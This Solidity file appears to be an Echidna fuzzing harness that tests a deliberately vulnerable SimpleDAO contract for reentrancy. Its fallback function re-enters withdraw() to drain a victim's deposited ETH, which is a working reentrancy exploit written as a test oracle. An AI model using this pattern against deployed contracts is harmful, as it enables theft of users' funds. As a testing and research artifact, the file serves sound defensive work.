pragma solidity ^0.4.2;

// Reusable REENTRANCY oracle (Mechanism A) wrapping a REAL dataset contract:
// dataset/vulnerable/reentrancy/simple_dao.sol — the canonical SimpleDAO whose
// withdraw() sends ETH before updating state.
//
// This harness plays the attacker: it seeds the pool with a "victim's" funds,
// deposits a little of its own, then withdraws — re-entering via the fallback to
// drain the victim's ETH too. The reusable rule for ANY deposit/withdraw
// contract: "you can never get back MORE than you put in for yourself."
import "../dataset/vulnerable/reentrancy/simple_dao.sol";

contract ReentrancyEchidnaTest {
    SimpleDAO public dao;
    uint256 public donatedSelf;   // ETH we put into the pool crediting OURSELVES
    uint256 public received;      // ETH the pool has paid back to us
    bool internal attacking;

    // Payable so Echidna can fund it (balanceContract config gives it ETH).
    function ReentrancyEchidnaTest() public payable {
        dao = new SimpleDAO();
    }

    // Seed the pool: a victim deposits 2 ETH, the attacker deposits 1 ETH.
    function setup() public {
        if (donatedSelf == 0 && address(this).balance >= 3 ether) {
            dao.donate.value(2 ether)(address(0xdead)); // victim's money in the pool
            dao.donate.value(1 ether)(this);            // attacker's own money
            donatedSelf = 1 ether;
        }
    }

    // Trigger the withdrawal that re-enters.
    function attack() public {
        if (donatedSelf > 0) {
            attacking = true;
            dao.withdraw(1 ether);
            attacking = false;
        }
    }

    // Re-entry hook: count what the pool pays us, and (while attacking) withdraw
    // again before the pool has updated our balance — draining funds that aren't ours.
    function () public payable {
        received += msg.value;
        if (attacking && address(dao).balance >= 1 ether) {
            dao.withdraw(1 ether);
        }
    }

    // REUSABLE REENTRANCY ORACLE: we must never receive back more than we
    // deposited for ourselves. Reentrancy lets us steal the victim's funds, so
    // `received` exceeds `donatedSelf` -> Echidna reports the violation + sequence.
    function echidna_no_reentrancy_theft() public view returns (bool) {
        return received <= donatedSelf;
    }
}
